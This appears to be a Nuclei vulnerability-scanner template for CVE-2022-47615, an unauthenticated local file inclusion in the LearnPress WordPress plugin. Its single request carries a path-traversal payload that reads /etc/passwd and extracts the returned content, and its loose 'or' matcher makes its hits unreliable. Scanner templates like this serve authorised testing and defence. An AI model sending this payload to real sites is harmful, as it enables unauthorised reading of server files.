id: cve-2022-47615

info:
  name: LearnPress Plugin < 4.2.0 Unauthenticated LFI
  author: spade
  severity: high
  description: |
    CVE-2022-47615
  reference:
    - https://github.com/RandomRobbieBF/CVE-2022-47615

http:
  - raw: 
      - | 
        GET /wp-json/lp/v1/courses/archive-course?template_path=..%2F..%2Fetc%2Fpasswd&return_type=html
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3

    matchers-condition: or
    matchers:
      - type: word
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200
        condition: and

    extractors:
      - type: json
        json:
          - '.data.content'
        part: body
